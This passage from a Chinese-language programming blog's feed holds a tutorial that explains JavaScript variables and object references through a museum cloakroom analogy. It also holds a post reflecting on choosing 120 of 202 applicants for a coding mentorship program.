href="/2019/10/31/travel-part2-818482a90bc9/">之前</a>去阿布達比的某個博物館的時候，在進去參觀以前就強迫要把身上比較大型的物件寄在櫃台，沒辦法帶進去。</p><p>其實這種作法在許多博物館滿常見的，可能是怕你背著包包之類的，一不小心在轉身時可能就會撞到物品吧？因此一定要你把東西寄著，不能帶進去。</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__X940JtYurJJKYCHo__pUm2g.png"></p><p>先讓我們想像有一間神奇的博物館，裡面有種某種魔力，讓進去的人都會短暫失憶，可能會忘記住址、手機，或是自己的名字（你的名字好看，讚）。</p><p>所以大家在進去博物館以前除了把身上的大型物件寄放在櫃台以外，還可以把這些個人資訊告訴服務人員，然後服務人員會把它寫在一張紙上，一樣放到後面的格子去。由於服務人員四個字有點多，我們之後就簡稱他叫做小博吧。</p><p>詳細流程是這樣的，要進去的觀光客會先到櫃台把自己的個人資訊告訴小博，這邊先假設是「名字」好了，例如說這個客人叫做「亞圖姆」，那小博就會撕下手邊的便條紙，在上面寫下「亞圖姆」三個字，然後放到某一格置物櫃去。</p><p>置物櫃都有編號，先假設這個編號是 A（對，用英文字母來排，而不是數字），接著小博就會拿編號 A 的號碼牌給亞圖姆，亞圖姆就開開心心進去博物館體驗魔力，跟著魔力一起轉圈圈了。</p><p>當亞圖姆出來的時候，就可以拿著這張編號是 A 的號碼牌給小博，小博去編號 A 的格子拿出紙條，然後告訴他說：「你的名字是…亞圖姆」，亞圖姆就可以成功想起自己的名字，開開心心地回家去。</p><p>除了名字以外，也可以寫自己的手機號碼，假設有一個人的手機號碼是 3345678，而且他特別叮嚀十點過後不要打給他，那小博就會把這個號碼寫在便條紙上，然後一樣放到某個格子去。這邊假設放到的是 B 格子好了，那當這個人逛完回來的時候，只要問小博：「B 格子放的東西是什麼？」，就可以找回自己的手機，如圖所示：</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__QPUCWga__sa4DSy8bEl4ABA.png"></p><p>既然姓名跟手機可以放，那生日當然也可以。假設小花是 9&#x2F;10 生的，告訴小博這個資訊以後，他就會把 9&#x2F;10 寫下來，放到 C 格子去（他想放哪就放哪，不按照順序也可以），然後把 C 格子的號碼牌拿給小花。</p><p>可是，那如果碰到同月同日生的人怎麼辦呢？假設今天有個人叫做小草，他也是 9&#x2F;10 生的，那會發生什麼事情？</p><p>小博有兩個選擇：</p><ol><li>看看格子中有沒有已經存在的生日，有的話就一樣拿同個號碼牌給他</li><li>把 9&#x2F;10 再寫一次，然後再找個格子放</li></ol><p>如果是你，你會選哪個？</p><p>我跟小博的選擇是一樣的，就是選項 2，把 9&#x2F;10 再寫一次，然後找個格子放。原因很簡單，因為我不可能去看現存的格子有沒有東西，這太耗時間了，不如直接寫一個比較快，所以就會變成這樣：</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__i45ZQe6Awy__Ml14xxrqGjA.png"></p><p>所以，小花 9&#x2F;10 生，資訊被放在 C 格子；小草也是 9&#x2F;10 生，資訊被放在 D 格子。這時候如果你問小博：</p><blockquote><p>請問，C 格子跟 D 格子的內容一樣嗎？</p></blockquote><p>小搏的答案跟我又是一樣的了，真是有默契，答案是：「對，啊不然勒，不都是 9&#x2F;10 嗎？」</p><p>然後突然有個情況發生了，那就是小草在還沒進去博物館之前突然想起了什麼，匆匆忙忙的跑回來跟小博說：「欸不對，我記錯生日了啦，我的生日其實是 9&#x2F;20，請幫我更正一下，我的格子是 D 格子」。</p><p>僅管小博很疑惑為什麼有人連自己的生日也會記錯，但還是幫他改了生日，把 D 格子原本的便條紙拿出去，重新寫了一張 9&#x2F;20 的放回去。</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__ppxsIZexIY8dBsvp____irKg.png"></p><p>就在小草心滿意足，順利踏進博物館以後，原本以為可以偷懶一陣子的小博卻又有事情要處理了。這次來的是小草的青梅竹馬：小梅，除了家裡就住隔壁以外，因為他們兩個生日一樣的關係，從小就特別親近，感情就特別好。</p><p>小梅這次不直接講自己的生日，而是跟小博說：</p><blockquote><p>我跟小草，對，就是剛那個 D 格子的同一天生，麻煩你囉！</p></blockquote><p>此時小博一樣有兩個選擇：</p><ol><li>直接把 D 格子的號碼牌拿給小梅</li><li>去 D 格子看小草的生日，再拿一張便條紙出來抄，然後再找個格子放</li></ol><p>選項 1 看起來很方便，但會有個問題。那就是，如果小草或是小梅過幾秒又跑回來，說自己記錯生日怎麼辦？那還不是要重新寫一張然後再找一個格子。那不如就維持之前的作法，再找一個格子，這樣每個人一個格子也比較不會搞錯。</p><p>於是，格子就變成這樣了：</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__t0WLhzIS28lH5ABUEG6n8A.png"></p><p>C 格子是小花的 9&#x2F;10，D 是小草的 9&#x2F;20，E 是小梅的 9&#x2F;20。皆大歡喜，可喜可賀，每個人都有一個專屬於自己的格子，而且不會干擾到別人的。</p><h3 id="中場休息時間"><a href="#中場休息時間" class="headerlink" title="中場休息時間"></a>中場休息時間</h3><p>小博的做事原則很簡單，就是：</p><ol><li>每一項資訊就是一個格子</li><li>格子之間互不干擾，因為格子不會被共用</li></ol><p>所以儘管同一天生，也是兩個格子。</p><p>而上面這些範例，其實就是在講變數的賦值。例如說：</p><pre><code class="js">var A = &quot;亞圖姆&quot;;</code></pre><p>就是一開始的：「把亞圖姆這個名字（字串）放到 A 格子裡面」。</p><p>之後小花與小草一開始的範例就是：</p><pre><code class="js">var C = &quot;9/10&quot;;var D = &quot;9/10&quot;;</code></pre><p>此時 C 格子跟 D 格子的內容是不是相等？是，所以 C 跟 D 是相等的，因為格子裡的東西相同。</p><p>而小草後來更改生日，就只是：</p><pre><code class="js">D = &quot;9/20&quot;;</code></pre><p>把 D 格子裡面的東西換掉，完全不會影響到其他格子，所以 C 格子依然是 9&#x2F;10，而現在 C 格子跟 D 格子就不相等了。</p><p>最後小梅說的：「我跟小草同一天生」，其實就是：</p><pre><code class="js">var E = D;</code></pre><p>讓 E 格子的內容跟 D 格子一樣，所以會把 D 格子的內容重新寫一次，再放到 E 格子去。因此 D 格子跟 E 格子的內容就一樣了，都是 9&#x2F;20。此時如果把 D 格子的內容改掉，也不會影響到 E 格子，就如同我們前面講過的一樣，格子之間互不干擾。</p><p>好，講到這邊相信大家應該都 ok，謹記兩個原則就對了：</p><ol><li>每一項資訊就是一個格子</li><li>格子之間互不干擾，因為格子不會被共用</li></ol><p>接著，就讓我們來看複雜一點的範例。</p><h3 id="背包問題"><a href="#背包問題" class="headerlink" title="背包問題"></a>背包問題</h3><p>有些人可能會覺得奇怪，博物館的這種寄物區到底記這些資訊要幹嘛，不是說好要「寄物」嗎？那物品在哪邊？說好的大型物件呢？</p><p>先別急，這不就來了嗎。</p><p>今天是個嶄新的一天，而昨天已經來過的小花，今天居然又來造訪一次。這次因為是學校下課以後直接過來博物館，所以身上背著又重又大的書包，是一定要寄放在櫃台的，不然可能會把一堆展覽品撞壞。</p><p>像是這種大型物件，不會直接放到櫃台後面的櫃子裡面，因為它太大了，所以這種櫃子放不下，而且這種東西通常比較貴重，如果放在外面有機率會被偷走，不能冒這種風險。那要放哪裡呢？</p><p>還記得前面畫的圖裡面，右邊有一個門嗎？門後面其實就是存放大型物件的空間，比較大的東西都會放在那裡。而那邊的置物區也有編號，我們就用數字來編號好了：</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__kwlnjQJ9fUZUqHvH1KK6zA.png"></p><p>那當遊客有大型物件需要存放的時候，會怎麼運作呢？</p><p>其實就跟之前要來寄放名字、電話以及生日差不多，只是多了一個流程而已。小博會先把小花的書包拿到小房間裡面，並且找一個空的櫃子放著，例如說是 1 號櫃子好了，他就會在便條紙上面用紅筆寫下：1，然後找一個空的格子放，例如說 A 格子，然後一樣把 A 格子的號碼牌交給小花。</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__KfPioUZHgl4tub9k6W7FDQ.png"></p><p>為什麼要用紅筆寫呢？因為其他遊客可能也會想要存「1」這個資訊，例如說他小孩 1 歲之類的。如果都用同樣顏色的筆來寫，那小博怎麼知道這個 1 代表的是資訊的 1，還是小房間櫃子的 1？因此要特別區分開來，用紅色來代表「這是櫃子編號，不是一般的資訊」。</p><p>你可能會想說，那小博幹嘛這麼大費周章，還要把 1 存到 A 格子裡，再把 A 格子的號碼牌交給小花，為什麼不直接把「1 號櫃子的號碼牌」給小花就好。</p><p>你這問題問得好，答案是：</p><blockquote><p>因為小房間裡的櫃子沒有號碼牌。</p></blockquote><p>只有外面櫃台後面的格子有相對應的號碼牌可以交給遊客，所以只能用這種比較迂迴的方式來處理，先把東西放到櫃子，再把櫃子編號寫下來，放到空的格子去，然後再把格子的號碼牌交給遊客。</p><p>當小花逛完博物館出來的時候，就要把手中的 A 格子號碼牌拿給小博，小博就會去看 A 格子的內容，發現是用紅筆寫的字，代表說：「這個東西在小房間櫃子裡」，然後看到字是 1，就走去小房間，把編號是 1 的櫃子裡的東西拿出來（也就是綠色包包），然後交給小花。</p><p>這個流程對於「增加物品」也是一樣的。</p><p>例如說小花寄放完包包以後過了兩分鐘，覺得博物館比想像中的熱，於是想要把身上的羽絨外套放進包包裡面，所以就去找小博，跟小博說：「可以把這個外套放進我的包包嗎？我包包放在 A 格子」</p><p>小博拿了外套以後，就去 A 格子看，看完 A 格子是紅筆寫的 1，於是就跑去小房間，把外套塞進編號 1 的櫃子，走出來跟小花說：「我幫你放進去囉」。</p><p>這都是一樣的流程，不過有一點特別要注意。</p><p>那就是，為什麼小花會說「我包包放在 A 格子」，而不是「我包包放在 1 號櫃子」呢？</p><p>因為，小花就只拿到 A 格子的號碼牌，他自然就以為自己的包包在 A 格子那裡，這很合理吧？對於遊客來說，他根本不清楚博物館的運作，也不太知道小房間裡面有櫃子這件事，更不知道用紅筆寫櫃子編號代表的意義。但是對小博來說，是不一樣的，東西實際上是在小房間，所以他必須走去小房間，才能進行相對應的動作。</p><p>所以對小花來說是一個步驟：「從 A 格子拿東西」，對小博來說則是兩個：「從 A 格子拿東西，發現 A 格子說東西在小房間櫃子 1，所以去小房間拿」。</p><p>會有這個差別，就是因為 A 格子「存放的內容」不一樣。原本很單純只存放資訊，例如說生日、電話或是姓名，小博只要看完 A 格子的內容，就可以告訴來詢問的人。但如果是大型物件的話，存放的內容其實只是一個「編號」，或我們其實可以說是一個「指引」，格子裡面的東西指引小博前往另外一個地方，前往物品真正存放的地方。</p><p>在 JavaScript 裡面，當你要儲存一個陣列或是物件的時候也是一樣的：</p><pre><code class="js">var A = [1, 2, 3];</code></pre><p>對你來說，你以為跟之前存字串沒有差別，可是其實有。你之前存字串的時候，就是直接在 A 格子裡面放 “9&#x2F;10” 這個字串。而現在存這個大型物件（陣列）的時候，底層的運作其實是先把 [1, 2, 3] 這個東西放到小房間編號是 1 的櫃子裡，然後再在 A 格子裡面放著用紅筆寫下「1」的便條紙。</p><p>所以你以為 A 格子裡面是你的東西，是 [1, 2, 3]，但不是。A 格子裡面其實只是一個編號，一個指引，你真正存放的東西其實是在隔壁小房間的 1 號櫃子。</p><p>好，接著讓我們拉回來博物館這邊。</p><p>除了小花以外，昨天有來過的小草又再來了一次（就是跟小梅是青梅竹馬的那個），而且很巧地，他居然背了一個跟小花一模一樣的綠色包包！想當然耳，這個包包也是一定要寄放在寄物區的。</p><p>於是小草就把包包拿給小博，而小博照著一樣的流程去跑：</p><ol><li>包包是大型物件，要放進小房間，所以先走進小房間</li><li>找一個空的櫃子放進去，就放 2 號櫃好了</li><li>用紅筆在便條紙上寫下 2，放進空的格子，就放 B 吧</li><li>把 B 的號碼牌拿給小草</li></ol><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__k1aTF7hAS8JaiuL7g7N2Kg.png"></p><p>今天你如果問小博：</p><blockquote><p>A 格子跟 B 格子裡的東西一樣嗎？</p></blockquote><p>答案當然是：No！不一樣！</p><p>一個裡面放著寫有 1 的便條紙，一個裡面放著寫有 2 的便條紙，怎麼會一樣？如果用程式碼來說明，就是這樣子：</p><pre><code class="js">var A = [1, 2, 3];var B = [1, 2, 3];console.log(A == B); // false</code></pre><p>前面有說過了，A 格子裡面放的是編號 1，真正的 [1, 2, 3] 在小房間櫃子 1，而 B 格子放的是編號 2，真正的 [1, 2, 3] 在小房間櫃子 2。所以 A 格子的內容（編號 1）跟 B 格子的內容（編號 2）一樣嗎？當然不一樣，而 &#x3D;&#x3D; 與 &#x3D;&#x3D;&#x3D; 都是去看<strong>格子裡的內容</strong>是否相等，所以會回傳 false。</p><p>那有沒有什麼內建的方法，不是去檢查「格子的內容」，而是去檢查 A 格子「所代表的東西」與 B 格子「所代表的東西」是否相等？沒有。</p><p>小博也不會去幹這種事。當有人問他 A 格子跟 B 格子是不是一樣的時候，他只要回頭看一下裡面放的內容，發現編號不一樣就可以跟你說不一樣了。如果要檢查「真正存放的大型物件」是否相等，他還要把編號記住，然後走進小房間裡面去看，還要仔細去檢查這兩個東西是不是真的一模一樣，顏色一樣、款式一樣、大小一樣…這花太多時間太麻煩了，所以他不會做這件事，而你寫的程式語言通常也不會。</p><h4 id="青梅竹馬再次登場"><a href="#青梅竹馬再次登場" class="headerlink" title="青梅竹馬再次登場"></a>青梅竹馬再次登場</h4><p>在小草把物品放好，正準備離開要去逛博物館的時候，他的青梅竹馬小梅又出現了。小梅認識小草已經好多年了，深知小草的個性以及各種毛病，其中最令人擔心的就是：「容易把東西搞丟」，丟手機、鑰匙那都不算什麼，你想得到的東西，小草都搞丟過；你想不到的東西，小草也搞丟過，例如說朋友的小孩、公司準備要發的年終獎金、老闆的假髮，以及一架鋼琴。</p><p>所以小梅知道，小草很有可能也會把手中的 B 格子號碼牌搞丟。一搞丟了就很麻煩，因為這取物是認號碼牌不認人的，號碼牌一丟了，就沒辦法證明包包是小草的，於是包包也丟了。</p><p>小梅心想這樣不行，於是跟小博說：「我們兩個一起來的，你也給我一張 B 格子的號碼牌吧！」</p><p>還記得一開始的時候也有過類似的情況嗎？小梅跟小博說他跟小草同一天生，而那時小博有兩個選擇：</p><ol><li>直接把格子的號碼牌拿給小梅</li><li>去格子看小草的生日，再拿一張便條紙出來抄，然後再找個格子放</li></ol><p>這一次小博也有兩個選擇：</p><ol><li>直接把 B 格子的號碼牌拿給小梅</li><li>去格子看小草的背包放哪裡，再拿一張便條紙出來抄，然後再找個格子放</li></ol><p>上次小博選了 2，而這一次小博同樣也選了 2，因為這樣規則就都是同一個，不會變來變去的，好記很多：</p><ol><li>每個格子只會有一個號碼牌</li><li>如果有人說他想共用格子，那就拿一張便條紙把格子內容記下來，然後再找個格子放</li></ol><p>上次的同一天生日是這樣，這次的包包也是。</p><p>所以小博去看了 B 格子的內容，發現是紅筆寫的 2，就再拿了一張便條紙用紅筆寫了 2，然後找了個空的格子 C，把便條紙放進去，然後把 C 的號碼牌交給小梅：</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__28C0P6J3KO7lPNPGJa0G6A.png"></p><p>所以如果 B 號碼牌被小草搞丟了，沒關係，小梅手上有一個 C 號碼牌，而用 C 號碼牌去取物的時候，一樣可以取到小草的包包，因為這兩個格子裡面存的內容都是「編號 2 的櫃子」。</p><p>這就跟下面程式碼是一樣的：</p><pre><code class="js">var B = [1, 2, 3];var C = B;console.log(B == C); // true</code></pre><p>而且還有一個重點，那就是你更改 C 的話，也會更改到 B：</p><pre><code class="js">var B = [1, 2, 3];var C = B;C.push(4);console.log(B); // [1, 2, 3, 4]</code></pre><p>這很合理嘛！因為這就是往包包放東西啊！</p><p>今天小梅跟小博說：「幫我把這把雨傘放進我包包裡，我包包在 C 格子」，小博就會去看 C 格子，發現寫著編號 2，就進小房間去找編號 2 的櫃子，然後把雨傘放進櫃子裡的包包。</p><p>啊這個包包就是小草的包包，所以小草的包包裡多了一把雨傘，這個十分合理。無論跟小博說要把東西放進 B 格子還是 C 格子，對小博來說都是一樣的，因為這兩個格子放的都是「前往編號 2 的櫃子的指引」，所以最後找到的都是同一個包包。</p><p>好，現在最後一個問題來了：</p><blockquote><p>那如果小梅突然有一個自己的包包想要放呢？</p></blockquote><p>這跟前面提到的一個案例差不多但是有一點出入，前面講生日那邊，有說到小草先說自己是 9&#x2F;10 生，接著小草又說自己記錯了，其實是 9&#x2F;20。</p><p>在這個情況下，當時小博的選擇很簡單，就是<strong>把小草格子的內容改成 9&#x2F;20</strong>。現在也是一樣的。</p><p>如果小梅有一個自己的包包想要放，那小博就會先把小梅的包包拿進去小房間，找一個空的櫃子，假設是 3，然後把原本小梅的 C 格子的內容改成 3，也就是這樣：</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__WUXsgQEdIL4W61SEAWl5xA.png"></p><p>那為什麼不是直接塞進去原本的櫃子 2 呢？因為櫃子很小，只能放一個物品而已，所以沒辦法放進去。如果要放進去，就只能把原本小草的包包丟出來才做得到。</p><p>所以小梅的包包就被放進新的櫃子，然後 C 格子裡的編號也換了。如此一來，B 跟 C 格子就是兩個完全不同的格子了，而且也不會互相干涉。</p><p>所以「放一個全新的包包」跟「往包包裡面塞東西」是不同的兩件事。</p><p>用程式碼來講就是這樣：</p><pre><code class="js">var B = [1, 2, 3];var C = B;C = [4, 5, 6]; // 新的包包，而不是往原本的包包塞東西console.log(B); // [1, 2, 3]</code></pre><p>C 格子的內容變成新的編號，而原本的 B 格子的內容並不會被影響到。現在如果往 B 格子放東西，就會放到小草的包包；如果往 C 格子放東西，就會放到小梅的包包。</p><p>最後讓我們來總結一下小博做事的 SOP，先從簡單的開始：</p><ol><li>如果客人放的不是大型物件，就直接在便條紙用普通的筆寫下資訊</li><li>把便條紙放進去空的格子，然後把格子的號碼牌交給客人</li><li>如果有人想放一樣的資訊，就把格子的內容抄起來，然後再放到新的空格子去</li><li>如果有人想更改資訊，就把格子的內容直接改掉</li></ol><p>那如果是大型物件的話，就是：</p><ol><li>把東西先放到小房間空的櫃子，並且拿一張便條紙用紅筆寫下編號</li><li>把便條紙放進去空的格子，然後把格子的號碼牌交給客人</li><li>如果有人想共用同一個東西，就把格子的內容抄起來，然後再放到新的空格子去</li><li>如果有人想更改資訊，就把格子的內容直接改掉</li></ol><p>看了看你會發現，其實對待一般的東西跟大型物品只有一個差別，那就是一般的東西，格子裡就是真正的資訊，而大型物品只是放一個「指引」，真正的物品其實是在隔壁小房間裡。</p><h4 id="回歸到程式"><a href="#回歸到程式" class="headerlink" title="回歸到程式"></a>回歸到程式</h4><p>在 JavaScript 裡面也是差不多的，當你想要存一般的資訊（數字、字串等等）的時候，變數裡面存的內容就真的是那個資訊。</p><p>但如果你想存物件或陣列的時候，變數裡面存的內容其實是「指引」，是前往某個小房子櫃子的指引。只是你在用的時候從外表看不出來，因為你是小草，是小梅，不是小博。</p><p>只有小博知道格子裡放的是指引，知道你的東西其實是在隔壁小房間，而你只會知道你有格子的號碼牌，而不知道你的東西真正放在哪裡。</p><p>在這個故事中，格子就代表著不同的變數，變數 A、B、C…而格子的內容就是變數裡面存放的資訊。然後小房間裡的櫃子編號，其實代表著就是記憶體位置。</p><p>這就是我一直跟學生講的：一般的東西存資訊，物件存記憶體位置。</p><p>而我前面反覆提到的「指引」兩個字，其實可以直接代換成「指標」，對，就是 C 語言裡面那個指標。一般的變數存資訊，而指標存的是記憶體位置，這是他跟其他變數最大的差異。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>再次強調一下，這個模型其實是不精確的，但這篇文章想傳達的最重要的概念，就是那個「指引」的概念。有些物品不是直接放在格子，而是放在其他地方，格子裡面放的只是一個指引，一個指示，或是一個指標。</p><p>還有另一個想傳達的概念就是：「往包包放東西（C.push(2)）」跟「放一個新的包包（C &#x3D; [4, 5, 6]）」是兩件完全不同的事，然後 C[0] &#x3D;3，這也算是「往包包放東西」，而不是放新的包包。</p><p>如果你想知道比較精確一點的模型，可能會長這樣：</p><p><img src="/img/variable-and-frontdesk-a53a0440af3c/1__XOgAsyigkL2Jpqf3pQsNkw.png"></p><p>其實沒有分什麼小房間跟格子，全部都是放在一起的，有一個超巨大的格子（就是記憶體啦），然後裡面會放很多東西（不過大型物件像是包包，的確會有自己的一區），而原本的格子名稱 A, B, C 其實只是一張貼紙而已，真正的格子都是用數字來編號的。</p><p>所以放東西的流程就變成：</p><ol><li>小博先找到一個空的格子，在上面貼上標籤 A</li><li>把資訊寫下來，放到格子裡</li><li>把號碼牌 A 交給客人</li></ol><p>不過其實我想強調的核心概念是一樣的，就是「有些格子存的是記憶體位置，而不是普通的值」，所以比較精確一點的模型就稍微看過就好，我覺得不太影響理解。</p><p>有些人可能會問說：「不過就是講個變數而已，有需要用那麼多篇幅嗎？」，我一開始也是這樣想，直到我碰到真的有這個需求的人。</p><p>希望這一篇可以幫助大家更全面地去理解變數以及記憶體相關的概念，就不會再對那些程式碼的結果感到疑惑。</p><p>也感謝程式導師實驗計畫第四期的學生與助教們，讓我有了這篇文章的靈感。</p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>讀完了兩百封報名信之後，我迷惘了</title>
      <link href="/2020/06/06/confused-d83a4091eca/"/>
      <url>/2020/06/06/confused-d83a4091eca/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/confused-d83a4091eca/0__FBdKHmk__BjbgM3Nd.jpg"></p><p>沒錯，標題就是這麼 real，整件事就跟標題說的一樣。</p><p>讀了一封封報名信以後，我真的迷惘了，就跟之前求職一樣，有時候你以為接觸愈多就會愈清楚，但事實卻正好相反。</p><p>我還跑回去翻了我以前的文章：<a href="/2018/08/19/mentor-program-register-3648c1b82cd7/">如何決定錄取與否？對計畫的反思以及對報名信的建議</a>，看一下以前的自己是怎麼想的。</p><p>這一次報名最大的問題是：</p><blockquote><p>以前的標準已經不適用了</p></blockquote><p>而背後的原因是：報名人數暴增。</p><p>如果只有 50 幾個，那我當然可以根據我以前的標準去篩，先假設可以篩掉個三成好了，然後其他七成（35 個）全部錄取。</p><p>但這一期的報名人數大概 200 個，七成就是 140 個，難道我要把 140 個都收進來嗎？不可能，這樣我負荷不來，也顧不了課程品質。</p><p>所以之前寫的那些就不管用了。儘管你有強烈轉職意願而且願意付出時間，也不保證能錄取，因為可能有其他 100 多個人都跟你一樣，站在相同的起跑點。</p><p>既然是這樣的話，該怎麼決定要收誰？</p><p>按照課程初衷，想要證明自己的教學能力的話，當然就是找張白紙，越白的越好，然後能夠付出一定時間，才能試試看我的課程是否也讓他們聽懂，試著幫助他們轉職成功。</p><p>前幾期基本上是這樣想的，但這期人數一多以後，就不太一樣了。很多報名的人都有接觸過一點程式，有些也在信中證明了有相當的自學能力，如果按照我上面說的，這些人的順位好像會被排在白紙後面。</p><p>咦，怎麼感覺有些奇怪。</p><p>這樣的話他們如果沒有被收進來，就是因為他們比較努力。因為比較努力，所以有學過程式有接觸過，也因為這樣，所以順位被排在白紙後面，就被刷掉了。</p><p>怎麼聽都覺得有點奇怪，居然是因為比較努力而被刷掉。</p><p>以前聽過很多去申請那種有名額限制的免費培訓班的案例，都說錄取門檻很高。我以前只想到有可能是想增加成效，所以要找比較厲害的或是有潛力的人進去。</p><p>但或許我想錯了，那只是結果看起來是這樣，可是原因不是的。不是因為想增加成效而找他們，而是因為本來就比較想錄取他們。理由也滿合理的嘛，因為他們在進去前就證明自己有學習能力。</p><p>好，那我就從有學習能力也有學過程式的人開始收？</p><p>可是，那些白紙怎麼辦？就算了嗎？可是沒有白紙的話，該怎麼驗證自己的教學？不是說想好找白紙的嗎？</p><p>所以我迷惘了。</p><p>做這個教學做到第四期，似乎變得不太一樣了。但我不確定是我忘了初衷，還是初衷本來就是一個可以變的東西。畢竟現在跟第一期比起來，本來就不一樣了。能收的人變多了，自然就可以考慮更多元的學生組成。</p><p>像是第三期，有收一些本來就會寫程式的人進來，也有收一些設計師或是有設計相關背景的，這算是一個新的嘗試，而且成效出乎意料的好。原因是，那些本來就會寫程式的人可以當作領頭羊，在前面領跑，無形之間帶著大家一起往前進。</p><p>這不是需要他們主動做的事情，而是他們的作業、他們的進度，甚至是他們的存在本身，就對這個計畫有幫助。</p><p>而後面那些白紙可以看到一個接近的 role model 長什麼樣子，以他為目標來邁進，也能看到他們的作業，知道那個程度的人做出來的東西是什麼樣子。這種化學反應是我之前沒有想過的。</p><p>而且除了以上兩種，還有另外一種人，就是這一期開的 B 方案，為付不出太多時間卻又想系統性學習程式的人設計的方案。如果開了這個方案結果卻不收人進來也太靠杯。</p><p>話說還有一點是很值得思考的，那就是：「你要怎麼知道這些無基礎的人，是真的有心想學習程式？」，報名信上寫說：「我真的好想學程式」就真的是很想學程式嗎？這當然不一定。</p><p>那該怎麼證明你真的有心學程式？很簡單，你之前有碰過程式有寫出心得，而且是持續地在寫心得，我就知道你是真的有在接觸而且不間斷，這是最好的證明方法，不要用說的，要做的。可是如果只往這個方向去思考，就會漏掉一些：「沒碰過程式但真的很有心學習」的人（不過問題又來了，我要怎麼知道你是真的很有心？），而這些人也是我想收進來的。</p><p>所以呢，到底要收哪一種？白紙還是非白紙？A 方案多還是 B 方案多？</p><p>如果是以「驗證教學成效」為主要考量，顯然是白紙 + 方案。如果是以「賺錢」為主要考量，一定就是非白紙 + B 方案，收入可以最大化。</p><p>可是一定要這麼極端，這麼二分法嗎？這又不是二值邏輯，只能有 true 跟 false，我可以摻在一起做撒尿牛丸啊（現在的小朋友是不是不懂這句在幹嘛了）！</p><p>所以最後決定不要特別控制比例，就按照「我想收進來」的篩選方式去篩，步驟是：</p><ol><li>先按照以前那樣，把那些收到報名信之後就很想錄取的放進一個清單</li><li>如果人數超過預期，再從清單裡面把人挑出來</li><li>如果已經篩到我覺得沒辦法再篩，那就爆人數吧，挑戰極限</li></ol><p>這個「我想收進來」就是一個我也不知道該怎麼解釋的標準。</p><p>最後的結果是：</p><blockquote><p>202 人報名，120 人錄取，82人淘汰，錄取率大概六成。</p></blockquote><p>我相信最後找進來的人一定會有 false positive，我看你報名信覺得：哇這個人不錯，但實際進來卻跟想像中不一樣。被淘汰的人裡面一定也有 false negative，明明真的很有心而且很有能力卻被淘汰。</p><p>但我只能說，這已經是我根據現有的資訊量能做出的最好的決定了，而誤判是一定會發生的。</p><p>因此那些被淘汰的朋友們，被刷掉很可能不是你的問題，是我眼光不好，所以千萬不要灰心了。不要因為被我刷掉就覺得一定都是自己的問題。有可能是，也有可能不是。重點是要怎麼把自己變得更好，然後再去迎接下一個挑戰。</p><p>最後來講點我覺得以後可以改進的東西。</p><p>之前就有稍微提過以後想做的方向了，在這邊整理一下順便跟大家分享，不過先聲明，以下提的東西「都還沒確定要做」，只是有一些雛形而已。</p><p>之後我想把程式導師實驗計畫基礎的部分分出來，變成獨立的課程，而且會是免費的（對，我就愛免費）。</p><p>基礎指的是：</p><ol><li>Command line 基礎</li><li>Git 基礎</li><li>JavaScript 基礎</li><li>HTML + CSS 基礎</li></ol><p>既然分出來了，我就可以在課程裡面把這些東西給拿掉，或者是濃縮成兩三週，這樣計劃就有時間可以教一些更深的東西。而以後程式導師實驗計畫的定位也不一樣了，不再是「完全沒有基礎的新手」，而是「修過這些課程的新手」。</p><p>為什麼？因為我想把這個視為是一種「工作量證明」（這詞用在這邊不知道會不會怪怪的，但我很想用所以還是用了）。</p><p>你要怎麼證明你有心想自學？你要怎麼證明你願意付出時間？</p><p>你只要先把我公開出去的那些課程修完，我就認可你是有這個心的，就有資格可以報名下一期的程式導師實驗計畫。那如果沒有呢？沒有的話就去乖乖修完啊，修完再來談。</p><p>上面這是一種方向，然後另外一種方向是像 ALPHA Camp 那樣，把課程分成四個學期，第一學期就是我上面說的那些基礎。</p><p>分成四個學期的好處是一樣可以有原本計劃中的那些優點，像是社群討論或是改作業之類的，這是前面把課程獨立出來沒有的優點，不過缺點就是我會比較累啦，每次光是處理報名信跟後續加入計畫的事項就花費不少時間了。</p><p>兩種方向我還沒有確定是哪一種，只是想先跟大家說之後很有可能會朝這方向邁進。除此之外也有可能開一堂「讓初學者體驗寫程式的樂趣」的課程，這是我以前沒有想過，但現在卻很想做的事。</p><p>講到這個，提一下很多人報名信上寫的，那就是原本以為第四期不開了後來卻又開了。有些人可能會覺得這樣很反覆，對，我就反覆。</p><p>但這也是沒辦法的事，因為第四期本來就真的不開了，是後來計畫有變才又起了開第四期的念頭。是我沒有想清楚嗎？或許是，也或許不是。畢竟在做決定的當下，我是真的覺得自己想清楚了。</p><p>好，最後跟大家總結一下。</p><ol><li>第四期 202 人報名，120 人錄取，82人淘汰</li><li>下一期的程式導師實驗計畫有可能會做些許調整，但方向不確定，總之如果確定了會儘早公告</li></ol><p>就是這樣啦，之後有的忙了…</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>轉職軟體工程師可能沒有你想像中的那麼美好</title>
      <link href="/2020/06/02/to-be-an-engineer-c20c962d44cf/"/>
      <url>/2020/06/02/to-be-an-engineer-c20c962d44cf/</url>
      
